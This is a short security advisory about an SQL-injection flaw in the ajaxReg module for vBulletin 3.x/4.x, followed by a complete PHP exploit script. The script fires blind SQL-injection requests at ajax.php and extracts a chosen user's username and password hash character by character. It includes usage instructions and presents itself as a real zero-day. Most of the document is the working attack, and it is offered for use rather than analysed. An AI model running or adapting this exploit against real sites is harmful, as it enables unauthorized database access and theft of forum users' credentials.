source: http://www.securityfocus.com/bid/56877/info

The ajaxReg module for vBulletin is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.

A successful exploit may allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database. 

#!/usr/bin/php
<?

# vBulletin 3.x/4.x AjaxReg remote Blind SQL Injection Exploit
# https://www.example.com/-4HcW64E57CI/ULWN9mDnK8I/AAAAAAAAABo/cc0UA9eV_ak/s640/11-26-2012%25206-02-5s3%2520AM.png
# livedemo : http://www.example.com/watch?v=LlKaYyJxH7E
# check it : http://www.example.com/vBulletin/clientscript/register.js

function usage ()
{
    echo
        "\n[+] vBulletin 3.x/4.x AjaxReg remote Blind SQL Injection Exploit".
        "\n[+] Author: Cold z3ro".
        "\n[+] Site  : http://www.example.com | www.example.com".
        "\n[+] vandor: http://www.example.com/forum/showthread.php?t=144869".
        "\n[+] Usage : php 0day.php <hostname> <path> [userid] [key]".
        "\n[+] Ex.   : php 0day.php www.example.com /vBulletin/ 1 abcdefghijklmnopqrstuvwxyz".
        "\n[+] Note. : Its a 0day exploit\n\n";
    exit ();
}
 
function check ($hostname, $path, $field, $pos, $usid, $char)
{
    $char = ord ($char);
    $inj = 'ajax.php?do=CheckUsername&param=';
  $inj.= 
"admin'+and+ascii(substring((SELECT/**/{$field}/**/from/**/user/**/where/**/userid={$usid}),{$pos},1))={$char}/*";
  $culr = $hostname.$path.$inj;
  $curl = curl_init();
  curl_setopt ($curl, CURLOPT_URL, $culr );
  curl_setopt($curl, CURLOPT_HEADER, 1);
  curl_setopt($curl, CURLOPT_VERBOSE, 0);
    ob_start();
    curl_exec ($curl);
    curl_close ($curl);
    $con = ob_get_contents();
    ob_end_clean();
  if(eregi('Invalid',$con))
      return true;
    else
        return false;
}
 
 
function brutechar ($hostname, $path, $field, $usid, $key)
{
    $pos = 1;
    $chr = 0;
    while ($chr < strlen ($key))
    {
        if (check ($hostname, $path, $field, $pos, $usid, $key [$chr]))
        {
            echo $key [$chr];
            $chr = -1;
            $pos++;
        }
        $chr++;
    }
}
 
 
if (count ($argv) != 4)
    usage ();
 
$hostname = $argv [1];
$path = $argv [2];
$usid = $argv [3];
$key = $argv [4];
if (empty ($key))
    $key = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
 
echo "[+] Username: ";
brutechar ($hostname, $path, "username", $usid, $key);
echo "\n[+] Password: ";
brutechar ($hostname, $path, "password", $usid, $key);
echo "\n[+] Done..";
echo "\n[+] It's not fake, its real.";
# word to 1337day.com, stop scaming me

?>